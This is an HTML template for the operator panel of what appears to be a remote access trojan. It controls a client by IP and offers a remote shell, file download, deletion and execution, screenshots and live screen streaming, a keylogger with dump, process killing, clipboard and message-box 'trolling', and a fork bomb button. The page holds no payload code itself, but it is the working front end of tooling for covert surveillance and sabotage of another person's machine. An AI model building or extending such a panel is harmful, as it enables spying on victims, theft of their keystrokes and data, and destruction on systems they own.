<!doctype html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Client Control Panel</title>
        <!-- Tailwind CSS -->
        <script src="https://cdn.tailwindcss.com"></script>
        <!-- htmx -->
        <script
            src="https://unpkg.com/htmx.org@1.9.10"
            integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC"
            crossorigin="anonymous"
        ></script>
    </head>
    <body class="bg-gray-900 text-white p-8 font-sans">
        <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-6xl mx-auto">
            <h2 class="text-2xl mb-6 font-semibold">
                Controlling Client:
                <span class="text-blue-400 font-mono">{{ ip }}</span>
            </h2>

            <!-- Main grid for control modules -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <!-- All forms now POST to the new unified endpoint -->

                <!-- 1. Remote Shell (RSH) Module -->
                <div
                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
                >
                    <h3 class="text-xl font-bold mb-3 text-indigo-400">
                        Remote Shell (RSH)
                    </h3>
                    <form
                        hx-post="/api/command/{{ ip }}"
                        hx-target="#command-output-{{ ip }}"
                    >
                        <input type="hidden" name="module" value="RSH" />
                        <div class="flex flex-col md:flex-row gap-2">
                            <input
                                type="text"
                                name="args.command"
                                placeholder="Enter a command, e.g., whoami"
                                class="flex-grow p-3 bg-gray-800 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
                            />
                            <select
                                name="args.shell"
                                class="p-3 bg-gray-800 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
                            >
                                <option value="default">default</option>
                                <option value="cmd">CMD</option>
                                <option value="powershell">PowerShell</option>
                                <option value="bash">Bash</option>
                                <option value="sh">SH</option>
                            </select>
                            <button
                                type="submit"
                                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition"
                            >
                                Execute
                            </button>
                        </div>
                    </form>
                </div>

                <!-- 2. File System (FS) Module -->
                <div class="col-span-1 bg-gray-900 p-4 rounded-lg">
                    <h3 class="text-xl font-bold mb-3 text-indigo-400">
                        File System (FS)
                    </h3>
                    <div class="space-y-3">
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="FS" />
                            <input
                                type="hidden"
                                name="args.operation"
                                value="GET"
                            />
                            <input
                                type="text"
                                name="args.path"
                                placeholder="Path, e.g., C:\"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
                            >
                                Get Content / List
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="FS" />
                            <input
                                type="hidden"
                                name="args.operation"
                                value="MOV"
                            />
                            <input
                                type="text"
                                name="args.path"
                                placeholder="Source path"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <input
                                type="text"
                                name="args.to"
                                placeholder="Destination path"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
                            >
                                Move / Rename
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                            class="grid grid-cols-2 gap-2"
                        >
                            <input type="hidden" name="module" value="FS" />
                            <input
                                type="text"
                                name="args.path"
                                placeholder="Target Path for Ops Below"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 col-span-2"
                            />
                            <button
                                type="submit"
                                hx-vals='{"args.operation": "DOWN"}'
                                class="bg-sky-600 hover:bg-sky-700 p-2 rounded transition"
                            >
                                Download
                            </button>
                            <button
                                type="submit"
                                hx-vals='{"args.operation": "DEL"}'
                                class="bg-red-600 hover:bg-red-700 p-2 rounded transition"
                            >
                                Delete
                            </button>
                            <button
                                type="submit"
                                hx-vals='{"args.operation": "RUN"}'
                                class="bg-green-600 hover:bg-green-700 p-2 rounded transition col-span-2"
                            >
                                Run
                            </button>
                        </form>
                    </div>
                </div>

                <!-- And so on for all other forms... -->
                <div class="col-span-1 bg-gray-900 p-4 rounded-lg space-y-4">
                    <div>
                        <h3 class="text-xl font-bold mb-3 text-indigo-400">
                            Remote Screen (RS)
                        </h3>
                        <div class="grid grid-cols-2 gap-2">
                            <form
                                hx-post="/api/command/{{ ip }}"
                                hx-target="#command-output-{{ ip }}"
                                class="col-span-2"
                            >
                                <input
                                    type="hidden"
                                    name="module"
                                    value="RS"
                                /><input
                                    type="hidden"
                                    name="args.action"
                                    value="screenshot"
                                />
                                <button
                                    type="submit"
                                    class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
                                >
                                    Take Screenshot
                                </button>
                            </form>
                            <form
                                hx-post="/api/command/{{ ip }}"
                                hx-target="#command-output-{{ ip }}"
                            >
                                <input
                                    type="hidden"
                                    name="module"
                                    value="RS"
                                /><input
                                    type="hidden"
                                    name="args.action"
                                    value="stream_start"
                                />
                                <input
                                    type="number"
                                    name="args.fps"
                                    value="15"
                                    class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2 text-center"
                                />
                                <button
                                    type="submit"
                                    class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
                                >
                                    Start Stream
                                </button>
                            </form>
                            <form
                                hx-post="/api/command/{{ ip }}"
                                hx-target="#command-output-{{ ip }}"
                            >
                                <input
                                    type="hidden"
                                    name="module"
                                    value="RS"
                                /><input
                                    type="hidden"
                                    name="args.action"
                                    value="stream_stop"
                                />
                                <button
                                    type="submit"
                                    class="w-full h-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
                                >
                                    Stop Stream
                                </button>
                            </form>
                        </div>
                    </div>
                    <div>
                        <h3 class="text-xl font-bold mb-3 text-indigo-400">
                            Task Manager (TM)
                        </h3>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TM"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="list"
                            />
                            <button
                                type="submit"
                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition mb-2"
                            >
                                List Processes
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                            class="flex gap-2"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TM"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="kill"
                            />
                            <input
                                type="number"
                                name="args.pid"
                                placeholder="Process PID"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600"
                            />
                            <button
                                type="submit"
                                class="bg-red-600 hover:bg-red-700 p-2 rounded transition"
                            >
                                Kill
                            </button>
                        </form>
                    </div>
                </div>

                <!-- 4. Trolling (TRL) Module -->
                <div
                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
                >
                    <h3 class="text-xl font-bold mb-3 text-red-400">
                        Trolling (TRL)
                    </h3>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TRL"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="message_box"
                            />
                            <input
                                type="text"
                                name="args.title"
                                placeholder="Message Title"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <textarea
                                name="args.text"
                                placeholder="Message Text"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                                rows="2"
                            ></textarea>
                            <button
                                type="submit"
                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
                            >
                                Show Message
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TRL"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="open_link"
                            />
                            <input
                                type="url"
                                name="args.url"
                                placeholder="https://example.com"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
                            >
                                Open Link
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TRL"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="set_clipboard"
                            />
                            <input
                                type="text"
                                name="args.text"
                                placeholder="Clipboard Text"
                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
                            >
                                Set Clipboard
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input
                                type="hidden"
                                name="module"
                                value="TRL"
                            /><input
                                type="hidden"
                                name="args.action"
                                value="fork_bomb"
                            />
                            <button
                                type="submit"
                                class="w-full bg-red-800 hover:bg-red-900 text-white p-2 rounded transition font-bold"
                            >
                                !!! FORK BOMB !!!
                            </button>
                        </form>
                    </div>
                </div>

                <!-- 5. Keylogger (KL) & Chat (CH) Modules -->
                <div
                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
                >
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <h3 class="text-xl font-bold mb-3 text-indigo-400">
                                Keylogger (KL)
                            </h3>
                            <div class="grid grid-cols-3 gap-2">
                                <form
                                    hx-post="/api/command/{{ ip }}"
                                    hx-target="#command-output-{{ ip }}"
                                >
                                    <input
                                        type="hidden"
                                        name="module"
                                        value="KL"
                                    /><input
                                        type="hidden"
                                        name="args.action"
                                        value="start"
                                    />
                                    <button
                                        type="submit"
                                        class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
                                    >
                                        Start
                                    </button>
                                </form>
                                <form
                                    hx-post="/api/command/{{ ip }}"
                                    hx-target="#command-output-{{ ip }}"
                                >
                                    <input
                                        type="hidden"
                                        name="module"
                                        value="KL"
                                    /><input
                                        type="hidden"
                                        name="args.action"
                                        value="dump"
                                    />
                                    <button
                                        type="submit"
                                        class="w-full bg-blue-600 hover:bg-blue-700 p-2 rounded transition"
                                    >
                                        Dump
                                    </button>
                                </form>
                                <form
                                    hx-post="/api/command/{{ ip }}"
                                    hx-target="#command-output-{{ ip }}"
                                >
                                    <input
                                        type="hidden"
                                        name="module"
                                        value="KL"
                                    /><input
                                        type="hidden"
                                        name="args.action"
                                        value="stop"
                                    />
                                    <button
                                        type="submit"
                                        class="w-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
                                    >
                                        Stop
                                    </button>
                                </form>
                            </div>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold mb-3 text-indigo-400">
                                Chat (CH)
                            </h3>
                            <form
                                hx-post="/api/command/{{ ip }}"
                                hx-target="#command-output-{{ ip }}"
                                class="flex gap-2 mb-2"
                            >
                                <input
                                    type="hidden"
                                    name="module"
                                    value="CH"
                                /><input
                                    type="hidden"
                                    name="args.action"
                                    value="send"
                                />
                                <input
                                    type="text"
                                    name="args.message"
                                    placeholder="Your message..."
                                    class="w-full p-2 bg-gray-800 rounded border border-gray-600"
                                />
                                <button
                                    type="submit"
                                    class="bg-blue-600 hover:bg-blue-700 p-2 rounded transition"
                                >
                                    Send
                                </button>
                            </form>
                            <div class="grid grid-cols-2 gap-2">
                                <form
                                    hx-post="/api/command/{{ ip }}"
                                    hx-target="#command-output-{{ ip }}"
                                >
                                    <input
                                        type="hidden"
                                        name="module"
                                        value="CH"
                                    /><input
                                        type="hidden"
                                        name="args.action"
                                        value="start"
                                    />
                                    <button
                                        type="submit"
                                        class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
                                    >
                                        Start Chat
                                    </button>
                                </form>
                                <form
                                    hx-ext="json-enc"
                                    hx-post="/api/command/{{ ip }}"
                                    hx-target="#command-output-{{ ip }}"
                                >
                                    <input
                                        type="hidden"
                                        name="module"
                                        value="CH"
                                    /><input
                                        type="hidden"
                                        name="args.action"
                                        value="stop"
                                    />
                                    <button
                                        type="submit"
                                        class="w-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
                                    >
                                        Stop Chat
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Output Area -->
            <div class="mt-6">
                <h3 class="text-xl font-bold mb-3 text-gray-400">Output</h3>
                <div
                    id="command-output-{{ ip }}"
                    class="mt-4 text-sm bg-black p-4 rounded-lg font-mono whitespace-pre-wrap min-h-[100px]"
                >
                    <p class="text-gray-500">
                        Command output will appear here...
                    </p>
                </div>
            </div>
        </div>
    </body>
</html>
